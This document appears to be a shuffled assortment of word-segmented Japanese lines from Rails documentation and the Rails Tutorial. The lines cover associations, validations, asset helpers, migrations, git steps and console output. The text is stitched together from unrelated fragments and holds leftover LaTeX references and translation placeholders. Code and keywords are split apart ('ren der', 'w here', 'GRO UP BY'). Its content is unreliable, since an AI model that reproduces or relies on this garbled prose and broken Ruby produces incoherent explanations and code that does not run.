これ は リスト \ ref{ code :micropost _access_control } で 使用 さ れ て い ま し た 。
( in   /Users/lifo / Rails/blog )
* ` bind `
{ 0 } 図 12 ▖ 24 : {/ 0 }   { 1 } 本番 環境 で 動作 する ステータス フィード { / 1 }
モデル の インスタンス が 既に あ る 場合 は 、 トランザクション を 開始 し て その 中 で ロック を 一 度 に 取得 でき ま す 。
# =>  Thu ,   0 1   Apr  2010
これ に よ り 、 ひと つ の アプリケーション の 中 で 複数 の 独立 し た キャッシュ を 扱 う こと が でき る よう に な り ま す 。
これ は 、 \ kode {about } ビュー を 追加 する こと で 解決 し ま す 。
##### `months_ago` 、 `months_ since `
Java Script で は 、 document▖ cookie プロパティ を 使用 し て ドキュメント の cookie を 読み書き でき ま す 。
| `: words_connector `     | ` support▖array ▖ words_connector `     |
X - Runtime:   0 ▖ 0 13483
大 文字 小 文字 を 区別 し な い 、 一意 性 の テスト   (  \failing   )
どの よう な 種類 の オブジェクト が 渡 さ れ て も エラー メッセージ パーシャル が 動 く よう に する 必要 が あ り ま す 。
\ kode { has_ secure_ password } で 必要 と な る \ kode { password_digest } 属性 は これ で 準備 でき ま し た が 、 ハッシュ 化 さ れ て い な い 生 の パスワード も 参照 でき る と 便利 で す 。
    attr_ name  = @ base▖ class ▖ human_attribute_name ( attribute ,   default :   attr_ name )
個人 的 に は \ href { http://en ▖wikipedia ▖org/wiki / Touch_ (Unix ) }{Unix の touch コマンド } で ファイル を 作成 する の が かっこ い い と 思 い ま す 。
ここ で いく つ か 注意 す べ き 点 が あ り ま す 。
< script   src= " http://html 5shim▖googlecode ▖ com/svn/trunk/html 5 ▖ js" ></ script>
テキスト フィールド に 名前 と メール アドレス を 入力 し て   [ Create  User ]   ボタン を 押 し て くださ い 。
デフォルト の スコープ
一 度 正し い 関連 付け を 定義 し て しま え ば 、 \ kode {@micropost } 変数 の \ kode {user \ _ id } に は 、 関連 する ユーザー の id が 自動 的 に 設定 さ れ ま す 。
root  to :  " articles #index "
その 場合 は 関連 付け の メソッド 呼び出し で ` true ` を 指定 する だけ で 、 キャッシュ が 破棄 さ れ て データ が 再 読み込 み さ れ ま す 。
` after_ rollback ` コール バック や ` after_ commit ` コール バック を 定義 する と 、 この 変更 に ともな う 非 推奨 警告 が 表示 さ れ る よう に な り ま し た 。
#   </ contributor >
Home ページ に フォロー 関連 の 統計 情報 を 表示 する
パスワード 再 設定 の フォーム
Rails   5 ▖ 0 の テスト ケース は 、 デフォルト で ランダム に 実行 さ れ る よう に な る 予定 で す 。
$  git   format - patch   master   --stdout > ~/ my _ changes ▖ patch
# => {nil = > " " ,   1 = > " 1 " ,   : x = > " A " }
###  バリデーション 実行 時 の 動作
concern  : image_attachable  do
この 節 で は 、 その ため に 必要 な ログ アウト 機能 を 追加 する こと に し ま す 。
* `: as `
この メソッド は バリデーション を トリガ し 、 オブジェクト で エラー が 発生 し た 場合 は true を 、 そう で な けれ ば false を 返 し ま す 。
    has _one   : account ,  -> { includes : representative   }
% w ( a b  c  d ) ▖ to ( 2 )  # => % w ( a b  c )
` remove ` メソッド を 実行 する と 、 すべて の 該当 パターン が 削除 さ れ ま す 。
つまり 、 上 の コード は 以下 と 等価 で す 。
色 も ちゃんと 表示 し た い 場合 は \ ref{ sec : minitest _ reporters } を ご覧 くださ い 。
WARNING :   アプリケーション の 一部 、 特に ルーティング 周り で は 、 ` after_ initialize ` ブロック が 呼び出 さ れ た 時点 で は 設定 が 完了 し て い な い もの が あ り ま す 。
NOTE :   CSS や Java Script の 圧縮 を 有効 に する ` config ▖ assets▖ compress ` 初期 化 オプション は Rails   4 で 廃止 さ れ ま し た 。
stylesheet_link_tag  : all ,   cache:  true
たとえば 、 ` Photos Controller ` クラス の アクション から 出力 する の で あ れ ば 、 ` app/views/layouts/photos▖html ▖erb ` また は ` app/views/layouts/photos▖builder ` を 探 し ま す 。
def  full _message
` app/assets/stylesheets ` に 置 か れ て い る スタイル シート アセット へ の URL を 算出 し ま す 。
読 む に 値 する Rails 関連 の 書籍 や ドキュメント は 書店 や Web で いくら で も 見つけ られ ま す ▟ 正直 、 あまり の 多 さ に 閉口 する ほど で す 。
この コード は 一見 何 の 問題 も な い よう に 見え ま す 。
person ▖errors▖ clear
#####   攻撃 の 難読 化 と エンコーディング インジェクション
\ ref{ sec : login_success } で は 、 セッション を 操作 する ため に 必要 な コード を いく つ か 追加 し 、 ユーザー ログ イン を 完成 さ せ る 予定 で す 。
本 チュートリアル で は 、 コマンドライン   ( ターミナル )   の コマンド 例 が 多用 さ れ て い ま す 。
スコープ を 設定 する こと で 、 関連 オブジェクト や モデル へ の メソッド 呼び出し と し て 参照 さ れ る 、 よく 使用 さ れ る クエリ を 指定 する こと が でき ま す 。
パスワード 確認 の 強制 は コントローラ の 階層 で も 行 う こと が でき ま す が 、 モデル の 中 で Active   Record を 使用 し て 制限 を 与え る の が 慣習 に な っ て い ま す 。
$  bin/rails   generate  job  guests_ cleanup  --queue   urgent
Home ページ   ( \ href { http://0 ▖ 0 ▖ 0 ▖ 0 : 3000 / }{/})   に マイクロ ポスト の 投稿 フォーム を 追加 する
( 最初 に テスト を 作成 し て から に し て くださ い ▟ )
*  `config▖ action_dispatch▖encrypted_cookie_salt ` は 、 暗号 化 済み cookie 用 の salt 値 を 設定 し ま す 。
    ren der   : edit
#   指定 さ れ た 日付 を デフォルト 値 に 持 つ セレクト ボックス を 生成 する
本書 で は なるべく 問題 が 生 じ にく い よう な 手順 を 記載 し ま し た が 、 すべて を カバー する こと は でき ま せ ん ▟ 問題 が 生 じ た ら ネット を 検索 する の が 早道 で す 。
It   failed ▖
    x   + =   1
@order   = @customer▖ orders▖build (order_ date:   Time▖now ,
issue レポート が 自動 的 に 修正 担当 者 を 見つけ て くれ る こと も あ り ま せ ん し 、 他 の 開発 者 が 自分 の 作業 を 差し置 い て まで 修正 し て くれ る こと も あ り ま せ ん 。
*  `controls :  true ` は 、 ブラウザ が 提供 する ビデオ 制御 機能 を 使用 でき る よう に し ま す 。
リスト \ ref{ code : generating _ pages } や リスト \ ref{ code : generate_users_controller } で アクション 名 を 使用 し て 生成 し た 例 と 比較 し て み て くださ い 。
この オプション を 指定 する と 、 属性 の 値 が ` blank ? ` に 該当 する 場合 に バリデーション が パス し ま す ▟`blank ? ` に 該当 する 値 に は ` nil ` と 空 文字 も 含 ま れ ま す 。
self を 省略 し た 結果 を リスト \ ref{ code :settings_link_test } に 示 し ま す 。
created_at:   " 2013 - 0 3 - 1 1   0 0 : 57 : 46 " ,   updated_at:   " 2013 - 0 3 - 1 1   0 0 : 57 : 46 " >
  end
###  `overlaps?
### ` to _ formatted_s`
最後 に 、 ` create ` や ` new ` に ブロック が 渡 さ れ る と 、 新し い オブジェクト は 初期 化 の ため に ブロック に 渡 さ れ ま す 。
{ 0 } 第 { 1 } 1 { / 1 } 章 { / 0 } や { 2 } 第 { 1 } 2 { / 1 } 章 { / 2 } ,   I  suggest   following   the   “ hello ,   world ! ”
ここ まで 実装 を 進め て き た の で 、 あと ほんの 数行 を 追加 し て セキュア パスワード の 実装 を 完了 し 、 テスト スイート を 緑色   ( 成功 )   に し ま しょ う 。
#### `to ( position ) `
     cattr_accessor   : surname ,   instance_ accessor :  false
将来 変更 の 可能 性 が 少し で も あ る コード   ( HTML 構造 の 細部 など )   が あ れ ば 必ず テスト を 書 く 。
  else
( クラウド IDE の 場合 は < 自分 の システム > に Ubuntu と 指定 し ま す ) 。
検索 キー
false ▖ duplicable ?  
コード 自体 は 以下 の よう に な り ま す 。
特に 0 および 0 ▖ 0 は * * 空白 で は あ り ま せ ん * * の で ご 注意 くださ い 。
\emph { Ruby   on   Rails チュートリアル } の 第 2 版 と 本書 の バージョン と の 違い を 、 この 後 の リスト に 示 し ま す
*   Action   Pack 内 の ミドルウェアスタック に つ い て
*   Rails の ビルト イン ヘルパー の 活用 方法
  =>  Sun ,   13   Mar  2011   0 3 : 38 : 55   UTC   + 0 0 : 0 0
本章 で は 、 一番 重要 な ステップ で あ る ユーザー 用 の \emph { データ モデル } の 作成 と 、 データ を 保存 する 手段 の 確保 に つ い て 学 ん で い き ま す 。
# Blorgh/app/models/article ▖ rb
図 \ ref { fig : mvc_ detailed } で 行 わ れ て い る 手順 の 概要 を 以下 に 示 し ま す 。
╼ ╼\end {enumerate}╼╼    %  subsection  micropost _validations   ( end ) ╼╼    \ subsection {User /Micropost の 関連 付け }  %  ( fold) ╼    \ label{ sec :user_micropost _associations }╼╼
\ kode {relationships } テーブル を 作成 する ため に 、 いつ も の よう に データベース の マイ グレーション を 行 い ま す 。
データ モデル の 変更 が 必要 に な っ た ら その 都度 マイグレーション を 行 う の が Rails 流 で す 。
*  `create_association ! (
      if @user && @user ▖ guest ?
今度 は テスト スイート が { 0 } { 1 } { / 1 } { 1 } { 2 } 成功 { / 2 } { / 1 } { 1 } { / 1 } { / 0 } する はず で す 。
もし 莫大 な 数 の レコード に 対 し て この よう な コード を まとも に 実行 する と 、 コレクション 全体 の サイズ が メモリ 容量 を 上回 っ て しま う こと で しょ う 。
上 の コマンド で は 、 データベース から users テーブル を 削除 する ため に \ kode {drop \_table } コマンド を 内部 で 呼び出 し て い ま す 。
この リモート は upstream 以外 の 名前 に も 設定 でき ま す ▟ ` upstream ` と い う 名前 に し た く な い 場合 は 、 以下 の 手順 に 従 っ て 名前 を 変更 し ま す 。
この データ モデル の 模式 図 に する と 、 図 \ ref { fig :user_ has_many _ following } の よう に な り ま す 。
この コード は \ kode { db : populate } タスク を 定義 し ま す ▟ この タスク は 、 それ らし い 名前 と メール アドレス を 持 つ 99 の ユーザー を 作成 し 、 従来 の ユーザー と 置き換え ま す 。
デプロイ が 無事 に 終わ る と 、 本番 環境 で サンプル アプリケーション が 動 い て い る はず で す   ( 図 \ ref { fig : layout_production } ) 。
この メソッド は 、 指定 さ れ た テキスト に 基 い た リンク を 作成 し 、 ジャンプ 先 を 表示 し ま す ▟ ここ で は 各 記事 へ の パス を 指定 し ま す 。
今度 は 、 タイトル の テスト が パス する よう に し 、 それ と 同時 に Web ページ を 正し く 表示 さ せ る ため の HTML を すべて 追加 し ま しょ う 。
     sample  application ▖
特に 、 ` qualified_constant_defined ? ` メソッド は 2 つ 目 の 引数 と し て 、 述語 を 先祖 に 向 っ て 遡 っ て 探 す か どう か と い う フラグ を オプション で 指定 でき ま す 。
これ に よ り 、 必要 に 応 じ て 後 から アセット パイプライン を 追加 する こと も でき ま す 。
CSS マニフェスト に お け る ` require_tree ` ディレクティブ の 動作 は Java Script の 場合 と 同様 に 現在 の ディレクトリ に あ る すべて の スタイル シート を require し ま す 。
関連 する 以下 の テスト が 失敗 する こと を 確認 する こと で 、 この こと を ダブル チェック でき ま す 。
### `reorder `
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/object/with _options ▖rb ` で す 。
SELECT  *  FROM   clients   WHERE   removed_at   IS   NULL
  < script   src= " / javascripts/all ▖ js" ></ script>
` : on ` オプション は ` : create ` また は ` : update ` の いずれ か の 値 を 取 り ま す 。
ユーザー を 希望 の ページ に 転送 する に は 、 リクエスト 時点 の ページ を どこ か に 保存 し て お き 、 その 場所 に リダイレクト さ せ る 必要 が あ り ま す 。
ユーザー 登録 失敗 時 の エラー メッセージ
セキュア に ハッシュ 化 し た パスワード を 、 データベース 内 の \ kode { password_digest } と い う 属性 に 保存 でき る よう に な る 。
   def  validate
( \ ref{ sec : conventions } で も 説明 し た とおり 、 途中 の ドット だけ の 行 は 省略 を 意味 し て い る の で 、 その 部分 は その まま コピー し な い で くださ い ) 。
ちなみ に 、 ここ に flash の テスト も 追加 し て お く と よ い で しょ う ▟ これ は 演習 と し て 残 し て お き ま す   ( \ ref{ sec : exercises_a_test _ for_ valid _ submis sion } ) 。
{ 0 } 図 11 ▖ 10 { / 0 }   { 1 } マイクロ ポスト 作成 フォーム の あ る ホーム 画面 の モックアップ { / 1 }
| app/| ここ に は アプリケーション の コントローラ 、 モデル 、 ビュー 、 ヘルパー 、 メイラー 、 そして アセット が 置 か れ ま す 。
アプリケーション の 機能 向上 に 応 じ て 独自 の ヘルパー を 追加 する こと も 簡単 に でき ま す 。
使用 する すべて の キー と 値 を 列挙 する 理由 は 、 他 の フラッシュ メッセージ も 使え る よう に する ため で す 。
<%=   asset_path   'image▖ png ' ,   host :  'mycdnsubdomain▖fictional - cdn▖ com'  %>
これ は リスト \ ref{ code :remember_me_ternary } で 使用 さ れ て い ま し た 。
<% #   間違い   %>
まず は 後者 から 見 て み ま しょ う 。
数値 は さまざま な 方法 で フォーマット でき ま す 。
この コード は Rails と Ruby と SQL が 複雑 に 絡み合 っ て い て 厄介 で す が 、 ちゃんと 動作 し ま す 。
これ ら の ファイル や 、 その 他 重要 な 情報 を 含 む 可能 性 の あ る ファイル を 、 環境 に 合わせ て 複数 の バージョン を 使い分け る こと で さらなる アクセス 制限 を 行な う こと が でき ま す 。
#   calling   + to _s +   on   all elements  and   joining   them▖
最大 の 違い は 、 ユーザー 登録 は 誰 で も 実行 でき ま す が 、 ユーザー 情報 を 更新 でき る の は その ユーザー 自身 に 限 ら れ る と い う こと で す 。
foo= > nil
    * `: password ` -  メール サーバー で 認証 が 要求 さ れ る 場合 は 、 ここ で パスワード を 設定 し ま す 。
    -> {  w here   " factory   =  ' Seattle'"  }
この オプション は 、 デフォルト で は ` ActiveSupport: : Logger : : SimpleFormatter ` の インスタンス を 使用 し ま す ▟ ただし production モード の 場合 のみ ` Logger : : Formatter ` が デフォルト に な り ま す 。
   qualified_name  =  qualified_name _for   from _mod ,   const _ name
\ kode { add_ password_digest_to_users } と い う マイグレーション ファイル を 生成 する ため に は 、 以下 の コマンド を 実行 し ま す 。
この よう な 危険 が あ る から こそ 、 編集 し て も よ い 安全 な 属性 だけ を 更新 する こと が 重要 に な り ま す 。
詳細 に つ い て は 本 ガイド の [ ルーティング ] ( # ルーティング ) セクション で 解説 し ま す 。
ユーザー 名 と メール アドレス に 対応 する \emph { アトリビュート アクセサ } を それぞれ 作成 し ま す 。
ユーザー プロファイル ページ の 最終 的 な 目標 は 、 図 \ ref { fig : profile_mockup } の よう に ユーザー の プロファイル 写真 と 基本 ユーザー データ 、 そして マイクロ ポスト の 一覧 を 表示 する こと で す 。
いよいよ 、 最初 の サイン イン 要素 で あ る \ kode { sign_in } 関数 自身 の 実装 に 取りかか り ま しょ う 。
=>  " mhartl@example ▖ com "
#   アセット URL の ダイジェスト を 生成 する
*   アプリケーション が 返 し て くる 例外 を 捕え 、 例外 処理 用 の アプリケーション を 起動 し ま す ▟ 例外 処理 用 の アプリケーション は 、 エンド ユーザー 向け に 例外 を 整形 し ま す 。
パス する はず の テスト が 失敗 し た 場合 は 、 \ texttt { Ctrl - C } で Spork サーバー を 停止 し て 再 起動 し て くださ い 。
options
テスト に パス し た と し て も 、 コード の 中 に あ る 以下 の コメント に 気付 い た 方 も い る と 思 い ま す 。
``` coffeescript
##### `prev_month` 、 ` next _ month `
以下 の よう に な る はず で す 。
第 3 章 以降 で は 、 いよいよ 本格 的 な 大 規模 \ emph { サンプル アプリケーション }   ( \kode { sample\_app }  ) を 開発 し ま す ▟ 自動 生成 コード は 使 わ ず に 、 ゼロ から コード を 書き進め ま す 。
この 項 で は 、 ユーザー の プロフィール 画面   ( \kode { show ▖html ▖erb } )   で その ユーザー の マイクロ ポスト を 表示 さ せ 、 また 、 これ まで に 投稿 し た 総数 も 表示 する よう に し て い き ま す 。
*   development 環境 で コード の 再 読み込み を 行 う ため に 、 prepare コール バック と cleanup コール バック を 提供 し ま す 。
 table_name ▖pluralize  : table_name
`find_ by ! ` メソッド の 動作 は 、 マッチ する レコード が 見つか ら な い 場合 に ` ActiveRecord : : Record NotFound ` 例外 が 発生 する 点 を 除 い て 、 `find_ by ` メソッド と まったく 同じ で す 。
これ は リスト \ ref{ code : generate_users_controller } で 使用 さ れ て い ま し た 。
*  `set_autoload _ paths`:   この イニシャライザ は ` bootstrap_hook ` より 前 に 実行 さ れ ま す 。
####  一般 的 な エンジン の 設定
d   =  Date▖ new (2010 ,   5 ,   9 )   # =>  Sun ,   0 9   May  2010
開発 中 に \ href { http://en ▖wikipedia ▖org/wiki/Military _slang # SNAFU } { 袋小路 } に 迷い込 ん で しま っ た 場合 で も 、 これ ら の 機能 を 使 え ば 元 の 状態 を 復元 でき ま す 。
##### ` beginning _ of_day ` 、 `end _of_day `
上 の 場合 に は 、 ` Customer ` モデル の 方 に ` orders_count ` カラム を 追加 する 必要 が あ り ま す 。
person ▖errors ▖ messages
#   SELECT   id   FROM   people
1 つ の 行 が 長 く な り すぎ る 場合 は コメント を 次 の 行 に 置 い て も よ い
コントローラ 側 から 見 る と 、 HTTP レスポンス の 作成 方法 は 以下 の 3 とおり あ り ま す 。
ほとんど の 場合 、 ダブル クォート と シングル クォート の どちら を 使用 し て も 実質 的 に 同じ で す 。
` monday ` メソッド と ` sunday ` メソッド は 、 それぞれ 前 の 月曜 、 次 の 日曜 を それぞれ 返 し ま す 。
     page ▖emails ▖ create (
その 場合 、 以下 の 方法 で 設定 でき ま す 。
<%= = @ cms▖ current_template  %> <%# @ cms▖ current_template を その まま 挿入   % >
=>  " $ 2 a $ 10 $ kn 4cQDJTzV76 ZgDxOWk 6 Je 9 A0Ttn 5sKNa GTEmT0 jU 7▖ n ▖▖▖ "
##### ` collection▖build ( attributes = {}) `
    map  { | attribute ,   message|   full _message ( attribute ,   message)   }
次 に 必要 な メソッド は \ kode {html } で す ▟ これ は 、 引数 の 中 で 指定 さ れ た 要素 の 内側 に あ る HTML を 更新 し ま す 。
ブロック を 与え る 場合 に も 、 レシーバ が 空 の とき の デフォルト 値 を カスタマイズ でき ま す 。
続 い て 、 新し い 記事 を 1 つ 作成 し て み る こと に し ま しょ う 。
Transfer - Encoding :   chunked
\ kode {: data-turbolinks - track } と い う シンボル を 作成 し よう と し ま す が 、 シンボル で は ハイフン を 使用 でき な い ため 、 この 記法 は 無効 で す 。
$  git   push  origin   branch_ name
Sessions コントローラ の \ kode { create } に 上 の 行 を 追加 し た 結果 を リスト \ ref{ code :remember_me_ternary } に 示 し ま す ▟ 驚 く ほど コンパクト な コード に な り ま し た 。
*   X - Sendfile   header を 設定 し ま す 。
_'nosniff '  は Rails で は デフォルト で す ▟_ -  ファイル の MIME タイプ を ブラウザ が 推測 し な い よう に し ま す 。
以上 で Ruby の 文字 列 に 関 する 説明 は 終わり で す ▟ あ 、 言 い 忘れ て い た こと が あ り ま し た ね ▟ 「 Ruby の 世界 へ よ う こそ ! 」
issue の レポート に 続 く 貢献 方法 と し て 、 コア チーム が 既存 の issue を 解決 する の を 手伝 う こと も でき ま す 。
この フラグ は development モード と test モード で は true 、 production モード で は false に 設定 さ れ ま す 。
` instance_ variable_names ` メソッド は 配列 を 返 し ま す 。
* `:odd` - true に 設定 さ れ て い る 場合 は 、 奇数 で な けれ ば な り ま せ ん 。
tags = % w ( a   acronym b  strong   i  em  li  ul  ol   h 1   h 2   h 3   h 4   h 5   h 6 blockquote  br  cite   sub   sup  ins   p )
今後 は 常 に 文字 列 を キー に する よう に し て くださ い 。
Rails だけ は インストール さ れ て い ま せ ん が 、 これ は もちろん チュートリアル の ため に 意図 的 に そう し て あ り ま す   ( \ ref{ sec : installing _ rails } ) 。
#   SELECT   " articles " ▖
ある ミドルウェア の 後 に 別 の ミドルウェア を 追加 し た い 場合 は ` insert_after ` を 使用 し ま す 。
#####  コントローラ 用 の レイアウト を 指定 する
Author :   Michael   Hartl  <michael@michaelhartl▖ com>
Active   Record モデル の 力 に よ っ て 、 マイクロ ポスト も   ( ユーザー と 同じ で )   リソース と し て 扱え る
これ は リスト \ ref{ code : password _ reset_expire_test } で 使用 さ れ て い ま し た 。
###  スライス
また 、 フォロー し て い る ユーザー と 、 フォロワー に それぞれ 表示 用 の ページ を 作成 し ま す 。
      - h          This   message
( 3 つ 目 の 重要 な 機能 で あ る \emph { ミックス イン } に つ い て は 、 \ ref{ sec : rails_environments } で 紹介 し ま す ) 。
   belongs_to : client ,   counter_cache:  true
    padding :   2 px ;
       method_ name  =  "__bind_#{time▖to_ i}_#{time▖usec } "
フォロー し て い る ユーザー id の 文字 列 は 以下 の よう に な り ま す 。
サイト の レイアウト に デバッグ 情報 を 追加 する
###  サブ ディレクトリ に デプロイ する   ( 相対 URL ルート の 使用 )
インク ルード さ れ た CSS に よ っ て 生成 さ れ た HTML ソース 。
` classify ` が 返 す クラス 名 は 文字 列 で あ る こと に ご 注意 くださ い 。
*  `config▖ autoload _once_ paths` は 、 サーバー へ の リクエスト ごと に クリア さ れ な い 定数 を 自動 読込 する パス の 配列 を 引数 に 取 り ま す 。
     config▖ active_ record ▖ raise_ in_transactional _ callbacks =  true
上 の よう に 定義 さ れ た ビュー は 、 Home 、 Help 、 About ページ の 表示 は 以前 と 変わ り ま せ ん が 、 コード の 重複 が 大き く 削減 さ れ ま し た 。
この USAGE メッセージ は 左寄せ で 表示 さ れ ま す 。
以下 の コマンド を ターミナル で 実行 し て くださ い 。
\ kode { full_title } ヘルパー を 使 っ た Web サイト の レイアウト
[ 1 ,   2 ,   3 ,   4 ,   5 ]
 {| video|  video▖ category   ==   params [ : category ] }
      end
{ 0 } 図 10 ▖ 16 { / 0 } { 1 } マイクロ ポスト の 削除 リンク と   ( プロト)   フィード の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures/micropost_ delete_links_mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
モデル と モデル の 間 に は 関連 付け を 行な う 必要 が あ り ま す が 、 その 理由 を 御 存じ で しょ う か 。
リスト \ ref{ code : password _ reset_integration_test } で 使用 さ れ て い る アイデア の 大半 は 、 本 チュートリアル で 既出 で す ▟ 今回 の 新し い 要素 は \ kode { input } タグ ぐらい で しょ う 。
たとえば ` to ` メソッド は 、 配列 の 冒頭 から 、 渡 さ れ た インデックス が 示 す 箇所 まで の 範囲 を 返 し ま す 。
Rails の よう な アプリケーション の 場合 、 これ は アプリケーション の あらゆる 機能 を 一 つ 残 ら ず 確認 し な けれ ば な ら な い と い う こと で す 。
###  Active   Support を 設定 する
モジュール が 無名 また は トップ レベル の 場合 、 ` parent_ name ` は `nil ` を 返 し ま す 。
データベース へ の 接続 は 、 環境 変数 ` ENV [ ' DATABASE _ URL '] ` を 設定 する か 、 ` config/ database▖yml ` と い う ファイル を 設定 する こと で 行え ま す 。
Relationship モデル に 対 し て バリデーション を 追加 する
Rails   4 ▖ 2 で は 、 これ ら の インスタンス メソッド 呼び出し は ` deliver_now ` また は ` deliver_ later ` が 呼び出 さ れ る まで 実行 延期 さ れ ま す 。
これ は リスト \ ref{ code :user_relationships_association } で 使用 さ れ て い ま し た 。
     console   do
       format▖ text   { ren der  text :  'Ren der  text '   }
この 機能 が 必要 な 場合 は [ Active   Resource   gem ] (https://github▖ com/rails/activeresource )   を Gemfile に 追加 でき ま す 。
ステータス フィード が 追加 さ れ 、 \emph { Ruby   on   Rails チュートリアル } の サンプル アプリケーション が とうとう 完成 し ま し た 。
マイクロ ポスト を ユーザー の \ kode { show } ページ   ( プロフィール 画面 )   に 追加 する
エンジン も プラグ イン も 、 共通 の ` lib ` ディレクトリ 構造 を 共有 し 、 どちら も ` rails  plugin   new ` ジェネレータ を 使用 し て 生成 さ れ ま す 。
    raise   ArgumentError ,   " Regexp  multiline  option   not   allowed in   routing   requirements: #{requirement ▖ inspect } "
def  new
$  rails   generate  scaffold  User   name :string  email : string
SQL で は 、 ` GRO UP   BY ` フィールド で 条件 を 指定 する 場合 に ` HAVING ` 句 を 使用 し ま す 。
言い換え る と 、 \ kode {▖center } 冒頭 の ドット \ kode {▖} は 、 この ルール が クラス に 対 し て スタイル を 適用 する こと を 示 し て い ま す 。
< li >`: authentication`  -  メール サーバー で 認証 が 必要 な 場合 は ここ で 認証 の 種類 を 指定 する 。
( 警告 メッセージ が 若干 表示 さ れ る こと が あ り ま す が 、 今 は 無視 し て くださ い 。
フォロー し て い る ユーザー と フォロワー を 実装 する 前 に 、 ユーザー と リレーションシップ の 関連 付け を 行 い ま す 。
完全 に リファクタリング さ れ た ユーザー インデックス 。
User モデル に \ kode { following } の 関連 付け を 追加 する
トピック ブランチ を 削除 せ ず に 残 し て お け ば 、 トピック ブランチ と マスター ブランチ を 交互 に 行き 来 し て 、 きり の 良 い 所 で 変更 を マージ する 事 が でき ま す 。
NOTE : ` record ▖errors [ : base ] ` に 追加 さ れ る エラー は 、 概し て 特定 の 属性 より も その レコード 全体 の 状態 に 関係 し て い る もの で す 。
Client ▖find_ by   first _ name :  ' Jon'
ログ イン / 記憶 トークン / アカウント の 有効 化 / パスワード の 再 設定 で 似 て い る 点
* `: is `  -   属性 の 長 さ は 与え られ た 値 と 等し く な けれ ば な り ま せ ん 。
##### ` collection ▖exists ? ( ▖▖▖)
TIP :   上 の 例 から も わか る よう に 、 セパレータ が 連続 する と 空 の 配列 に な り ま す 。
ファイル ナビゲーター 内 の 隠し ファイル を 表示 する
###  バグ レポート を 作成 する
次 の 節 で は 、 アプリケーション で 新し い 記事 を 作成 し て それ を 表示 する 機能 を 追加 し ま しょ う 。
  <p >Welcome!  
Turbolinks は 、 ページ に あ る すべて の ` < a > ` に クリック ハンドラ を 1 つ ずつ 追加 し ま す 。
論理 値
上 の コード で あ れ ば 、 ブラウザ から 改めて index ページ に リクエスト が 送信 さ れ る の で 、 ` index ` メソッド の コード が 正常 に 実行 さ れ ま す 。
テスト スイート の 実行 で は 、 警告 表示 が オン に な り ま す 。
API   ドキュメント 作成 ガイドライン
\ ref{ sec : has_ secure_ password } で は 、 よく 使 わ れ る 最終 検証 と し て \emph { 確認   ( confirmation ) } を 追加 し ま す 。
<%=   javascript_ include_tag   " http://example ▖ com/main▖js" %>
これ は リスト \ ref{ code : generalized_authenticated_p } で 使用 さ れ て い ま し た 。
    module   Business
より 多く の パターン を 除外 する \ kode {▖ gitignore } ファイル 。
たとえば 以下 の 場合 、
関連 付け られ て い る オブジェクト の 1 つ で も 検証 ( validation ) エラー で 保存 に 失敗 する と 、 アサイン の 式 から は ` false ` が 返 さ れ 、 アサイン は キャンセル さ れ ま す 。
この テスト が パス する に は 、 テスト ファイル 内 の ドメイン 名 を 正し く 設定 する 必要 が あ り ま す   ( リスト \ ref{ code : test _domain_host } ) 。
# => [ [ " 1 " ,   " 2 " ,   " 3 " ] ,  [ " 4 " ,   " 5 " ,  nil ] ,  [ " 6 " ,   " 7 " ,  nil ] ]
  self  : qualified_const _ get ( mod _ name )
* `: destroy` --   その オブジェクト が destroy さ れ る と 、 関連 付け られ た オブジェクト に 対 し て ` destroy ` が 呼び出 さ れ ま す 。
generate(:scaffold ,   " person   name :string " )
*  `config▖ autoload _ paths ` は Rails が 定数 を 自動 読込 する パス を 含 む 配列 を 引数 に 取 り ま す 。
コミュニティ の メンバー が あなた の コード の 調整 を 求め て い る の で あ れ ば 、 その とおり に し て 再 送信 する 価値 が あ り ま す 。
以後 、 保存 さ れ た コンテンツ を 他 の テンプレート や レイアウト で 呼び出 す こと が でき ま す ▟ 呼び出し の 際 に は 、 `yield ` の 引数 と な る id を 渡 し ま す 。
` has_many ` 関連 付け が 使用 さ れ て い る 場合 、 その モデル の インスタンス は 、 反対 側 の モデル の 「 0 個 以上 の 」 インスタンス を 所有 し ま す 。
\ kode {div } タグ は 一般 的 な 表示 領域 を 表 し 、 ドキュメント を 別々 の パーツ に 分け る 以外 の こと は し ま せ ん 。
       create    Rakefile
------------------------------------------
これ で 、 少な く とも サイン イン の ルート を 追加 する まで の 間 、 リンク と 名前 付き ルート が 完成 し ま し た ( { 0 } { 1 } 第 8 章 { / 1 } { / 0 } ) 。
Action   View   の 概要
* ` ActionDispatch : : Flash ` は ` flash ` キー を 設定 し ま す 。
` ``erb
    cache▖ write ( join_asset_file_contents ( asset_paths) )
* `: less_than`  -   指定 さ れ た 値 より も 小さ く な けれ ば な ら な い こと を 指定 し ま す 。
ユーザー 登録 の 確認
###  変更 を コミット する
\ kode {assert_select } の いく つ か の 使用 例
self を 省略 し た 結果 を リスト \ ref{ code : add_activation_to_users _migration } に 示 し ま す 。
/ signin
生成 さ れ た User メイラー
\ ref{ sec : partial _ refactoring } で 見 た 次 の コード で は 、
  { " first _ name " = > " Eileen " ,   " created_at " = > " 2013 - 12 - 0 9   11 : 22 : 35 ▖ 221282 " }
それ で は 、 もう 一 度 リスト \ ref{ code :application_layout_redux } に 戻 り 、 レイアウト に   CSS   ( cascading  style   sheet )   を 追加 する 以下 の 行 を 見 て み ま しょ う 。
場合 に よ っ て は 、 既に 自分 の システム に Ruby が インストール 済み で あ る こと も あ り え ま す 。
拡張 し た マイクロ ポスト の データ モデル を 、 図 \ ref { fig : micropost _model_ image } に 示 し ま す 。
application_controller▖ rb
ルート   ( root )   へ の ルーティング を 定義 する 、 コメント 内 の ヒント 。
resources  : magazines   do
スキーマ ダンパー は 以下 の オプション を 追加 し ま す 。
HTTP / 1 ▖ 1   400   Bad   Request
Rails の フォーム 作成 は 非常 に 簡単 で す 。
dup [ : b ] [ : e ]   =   5
` Model ▖find (options ) ` と い う 操作 を 要約 する と 以下 の よう に な り ま す 。
この マイ グレーション は アプリケーション に 対 し て 実行 する 必要 が あ り ま す 。
[ Create  New orkspace ]   を 選択 し ま す 。
作成 し た コード を リスト \ ref{ code :image_uploader_ resizing } に 示 し ま す
1 つ の アクション は 、 データベース 上 で の 特定 の CRUD   ( Create/ Read /Update/ Delete)   操作 に 対応 付け られ る ルール に な っ て い ま す 。
Oh   &hellip; "
この メソッド は 、 フォーム が 送信 さ れ た とき に ユーザー インターフェイス 上 の チェック ボックス が オン に な っ て い る か どう か を 検証 し ま す 。
